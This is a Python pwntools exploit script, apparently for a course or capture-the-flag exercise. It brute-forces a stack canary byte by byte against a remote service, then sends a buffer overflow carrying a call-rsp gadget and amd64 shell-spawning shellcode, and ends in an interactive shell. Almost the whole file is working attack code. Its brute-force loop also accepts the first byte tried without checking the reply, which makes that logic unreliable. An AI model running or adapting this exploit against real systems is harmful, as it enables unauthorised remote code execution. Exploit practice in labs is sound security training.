from pwn import *

HOST = 'localhost'
PORT = 7033

COOKIE = b''
NEWLINE = 10

# Shellcode
context.arch = "amd64"
SC = asm(shellcraft.amd64.linux.sh())

CALLRSP = 0x4014c6

for i in range(8):
	for byte in range(256):
		try:
			if byte == 10:
				continue
				
			conn = remote("csc748.hostbin.org", 7033)

			response = conn.recvline()
			print(f"Recieved: {response.decode('utf-8').strip()}")
			
			test_cookie = COOKIE + byte.to_bytes(1, 'big')
			conn.sendline(b'A'*40 + test_cookie)
			
			response = conn.recvline()

			print(f"Send: {test_cookie.hex()} | Recieved: {response.decode('utf-8').strip()}")
			
			print(f'Found cookie: {test_cookie.hex()}')
			COOKIE = test_cookie
			break
			
			print("\n")
		except EOFError:
			print("EOFError recieved")
			print(f"Send: {test_cookie.hex()}")

		finally:
			conn.close()
					
conn = remote("csc748.hostbin.org", 7033)

response = conn.recvline()
print(f"Recieved: {response.decode('utf-8').strip()}")
conn.sendline(b'A'*40 + COOKIE + b'AAAAAAAA' + p64(CALLRSP) + SC)

conn.interactive()
			
			
			
			
